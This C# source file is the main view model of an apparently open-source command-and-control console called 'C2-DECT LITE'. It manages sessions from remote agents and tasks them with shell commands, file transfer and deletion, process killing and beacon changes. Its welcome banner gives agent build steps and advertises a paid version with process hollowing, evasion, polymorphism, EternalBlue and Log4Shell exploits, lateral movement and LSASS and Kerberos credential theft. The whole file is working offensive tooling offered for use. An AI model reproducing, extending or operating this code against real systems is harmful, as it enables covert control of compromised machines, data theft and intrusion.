using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using C2Dect.Lite.Models;
using C2Dect.Lite.Services;
using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Data;

namespace C2Dect.Lite.ViewModels;

public partial class MainViewModel : ObservableObject
{
    public static readonly IValueConverter FormatOsArch = new OsArchConverter();

    private sealed class OsArchConverter : IValueConverter
    {
        public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
            => value?.ToString() ?? "";

        public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
            => throw new NotSupportedException();
    }

    private readonly ApiService _api;
    private readonly AuthService _auth;

    [ObservableProperty] private object? _currentView;
    [ObservableProperty] private Session? _selectedSession;
    [ObservableProperty] private string _statusText = "Disconnected";
    [ObservableProperty] private bool _isConnected;
    [ObservableProperty] private string _currentOperator = "";
    [ObservableProperty] private int _activeSessions;
    [ObservableProperty] private int _totalSessions;
    [ObservableProperty] private string _serverUrl = "";

    public ObservableCollection<Session> Sessions { get; } = new();
    public ObservableCollection<C2Task> Tasks { get; } = new();
    public ObservableCollection<Loot> LootItems { get; } = new();
    public ObservableCollection<ConsoleMessage> ConsoleOutput { get; } = new();

    public SessionViewModel SessionVm { get; }
    public LootViewModel LootVm { get; }

    public MainViewModel(ApiService api, AuthService auth)
    {
        _api = api;
        _auth = auth;

        SessionVm = new SessionViewModel(api);
        LootVm = new LootViewModel(api);

        CurrentOperator = auth.CurrentOperator?.Username ?? "Unknown";
        ServerUrl = api.BaseUrl ?? "Unknown";

        IsConnected = true;

        ShowWelcome();
    }

    private void ShowWelcome()
    {
        LogInfo("=== C2-DECT LITE v1.0 (Open Source) ===");
        LogInfo($"Operator: {CurrentOperator}");
        LogInfo($"Server: {ServerUrl}");
        LogInfo("");
        LogInfo("Quick Start:");
        LogInfo("  1. Server is running on port 8443");
        LogInfo("  2. Compile and run the agent:");
        LogInfo("     cd agent && go build -o ../build/agent.exe .");
        LogInfo("     build\\agent.exe -s 127.0.0.1 -p 8443");
        LogInfo("");
        LogInfo("Type 'help' for all commands");
        LogInfo("=========================================");
        LogInfo("");
        LogInfo("Want more features? Contact us for PRO version:");
        LogInfo("  - P2P Mesh Network");
        LogInfo("  - Process Hollowing & Evasion");
        LogInfo("  - Polymorphic Engine");
        LogInfo("  - AI Assistant (Ollama/Llama)");
        LogInfo("  - Exploit Engine (EternalBlue, Log4Shell, etc.)");
        LogInfo("  - Lateral Movement (PsExec, WMI, WinRM)");
        LogInfo("  - Credential Access (LSASS, Kerberos, DPAPI)");
        LogInfo("  - And much more...");
        LogInfo("");
        LogInfo("Contact: nakano.04.2025@gmail.com | IG: @ruiso_nakano");
        LogInfo("=========================================");
    }

    public void LogInfo(string msg) => SafeAdd(new ConsoleMessage { Direction = "info", Content = $"[*] {msg}" });
    public void LogSent(string msg) => SafeAdd(new ConsoleMessage { Direction = "sent", Content = $"> {msg}" });
    public void LogReceived(string msg) => SafeAdd(new ConsoleMessage { Direction = "received", Content = msg });
    public void LogError(string msg) => SafeAdd(new ConsoleMessage { Direction = "error", Content = $"[!] {msg}" });

    private void SafeAdd(ConsoleMessage msg)
    {
        if (App.Current?.Dispatcher == null || App.Current.Dispatcher.CheckAccess())
            ConsoleOutput.Add(msg);
        else
            App.Current.Dispatcher.Invoke(() => ConsoleOutput.Add(msg));
    }

    private void Dispatch(Action action)
    {
        if (App.Current?.Dispatcher == null || App.Current.Dispatcher.CheckAccess())
            action();
        else
            App.Current.Dispatcher.Invoke(action);
    }

    [RelayCommand]
    private async Task LoadSessions()
    {
        try
        {
            var sessions = await _api.GetSessions();
            Dispatch(() =>
            {
                Sessions.Clear();
                if (sessions != null)
                    foreach (var s in sessions)
                        Sessions.Add(s);
                ActiveSessions = Sessions.Count(s => s.Status == "active");
                TotalSessions = Sessions.Count;
                StatusText = $"Loaded {Sessions.Count} sessions";

                if (Sessions.Count == 0)
                {
                    LogInfo("No active sessions.");
                    LogInfo("Compile and run the agent to get started:");
                    LogInfo("  cd agent && go build -o ../build/agent.exe .");
                    LogInfo("  build\\agent.exe -s 127.0.0.1 -p 8443");
                }
            });
        }
        catch (Exception ex)
        {
            LogError($"Failed to load sessions: {ex.Message}");
        }
    }

    [RelayCommand]
    private async Task LoadTasks()
    {
        if (SelectedSession == null) return;
        try
        {
            var tasks = await _api.GetTasks(SelectedSession.Id);
            Dispatch(() =>
            {
                Tasks.Clear();
                if (tasks != null)
                {
                    foreach (var t in tasks)
                        Tasks.Add(t);

                    foreach (var t in tasks.Where(t => t.Status == "completed" && !string.IsNullOrEmpty(t.Result)))
                    {
                        LogReceived($"[{t.Command}] {t.Result}");
                    }
                }
            });
        }
        catch (Exception ex)
        {
            LogError($"Failed to load tasks: {ex.Message}");
        }
    }

    [RelayCommand]
    private async Task SendCommand(string command)
    {
        if (string.IsNullOrWhiteSpace(command)) return;

        if (command.Trim().ToLower() == "help")
        {
            ShowHelp();
            return;
        }

        if (command.Trim().ToLower() == "clear")
        {
            ConsoleOutput.Clear();
            ShowWelcome();
            return;
        }

        if (command.Trim().ToLower() == "refresh")
        {
            await LoadSessions();
            if (SelectedSession != null)
                await LoadTasks();
            return;
        }

        if (command.Trim().ToLower() == "cleanup")
        {
            LogInfo("Cleaning up stale sessions (>30 min)...");
            try
            {
                var result = await _api.CleanupStaleSessions(30);
                LogInfo($"Cleanup done: {result}");
                await LoadSessions();
            }
            catch (Exception ex)
            {
                LogError($"Cleanup failed: {ex.Message}");
            }
            return;
        }

        if (command.Trim().ToLower() == "deleteall")
        {
            LogInfo("Deleting ALL sessions...");
            try
            {
                var result = await _api.DeleteAllSessions();
                LogInfo(result);
                Dispatch(() =>
                {
                    Sessions.Clear();
                    SelectedSession = null;
                    Tasks.Clear();
                    ConsoleOutput.Clear();
                });
                ShowWelcome();
            }
            catch (Exception ex)
            {
                LogError($"Delete failed: {ex.Message}");
            }
            return;
        }

        if (SelectedSession == null)
        {
            LogError("No session selected. Select a session first.");
            return;
        }

        if (SelectedSession.Status != "active")
        {
            LogError($"Session {SelectedSession.DisplayName} is not active (status: {SelectedSession.Status})");
            return;
        }

        LogSent(command);

        try
        {
            var task = await _api.SubmitTask(SelectedSession.Id, command);
            if (task != null)
            {
                Dispatch(() =>
                {
                    Tasks.Insert(0, task);
                    StatusText = $"Task {task.Id} sent to {SelectedSession.DisplayName}";
                    LogInfo($"Task {task.Id} submitted. Waiting for result...");
                });
            }
            else
            {
                LogError("Failed to submit task - no response from server");
            }
        }
        catch (Exception ex)
        {
            LogError($"Failed to send command: {ex.Message}");
        }
    }

    private void ShowHelp()
    {
        LogInfo("=== C2-DECT LITE - AVAILABLE COMMANDS ===");
        LogInfo("");
        LogInfo("System Commands:");
        LogInfo("  sysinfo        - System information");
        LogInfo("  netinfo        - Network configuration");
        LogInfo("  ps             - List processes");
        LogInfo("  kill <pid>     - Kill process");
        LogInfo("  services       - Running services");
        LogInfo("  env            - Environment variables");
        LogInfo("  connections    - Network connections (netstat)");
        LogInfo("");
        LogInfo("File Commands:");
        LogInfo("  ls <path>      - List files");
        LogInfo("  cat <file>     - Read file contents");
        LogInfo("  upload <path>  - Upload file");
        LogInfo("  download <path> - Download file");
        LogInfo("  cp <src> <dst>  - Copy file");
        LogInfo("  mv <src> <dst>  - Move file");
        LogInfo("  rm <path>       - Delete file");
        LogInfo("  mkdir <path>    - Create directory");
        LogInfo("  find <dir> <pattern> - Search files");
        LogInfo("");
        LogInfo("Shell:");
        LogInfo("  shell <cmd>    - Execute shell command");
        LogInfo("");
        LogInfo("Agent Control:");
        LogInfo("  sleep <sec>    - Change beacon interval");
        LogInfo("  exit           - Terminate agent");
        LogInfo("");
        LogInfo("GUI Commands:");
        LogInfo("  refresh        - Refresh sessions");
        LogInfo("  clear          - Clear console");
        LogInfo("  cleanup        - Delete stale sessions (>30min)");
        LogInfo("  deleteall      - Delete ALL sessions");
        LogInfo("  help           - Show this help");
        LogInfo("");
        LogInfo("===========================================");
        LogInfo("");
        LogInfo("Need more features? Contact us for PRO version!");
        LogInfo("Email: nakano.04.2025@gmail.com | IG: @ruiso_nakano");
        LogInfo("===========================================");
    }

    [RelayCommand]
    private void NavigateToSessions() => CurrentView = this;

    [RelayCommand]
    private void NavigateToLoot() => CurrentView = LootVm;

    [RelayCommand]
    private async Task RefreshAll()
    {
        await LoadSessions();
        if (SelectedSession != null)
            await LoadTasks();
        StatusText = $"Refreshed at {DateTime.Now:HH:mm:ss}";
        LogInfo("Refreshed all data");
    }

    [RelayCommand]
    private void ClearConsole()
    {
        ConsoleOutput.Clear();
        ShowWelcome();
    }

    [RelayCommand]
    private void Disconnect()
    {
        StatusText = "Disconnected by user";
        LogInfo("Disconnected from server");
    }

    partial void OnSelectedSessionChanged(Session? value)
    {
        if (value != null)
        {
            LogInfo($"Selected session: {value.DisplayName} ({value.OS} {value.Arch})");
            _ = LoadTasks();
        }
    }
}
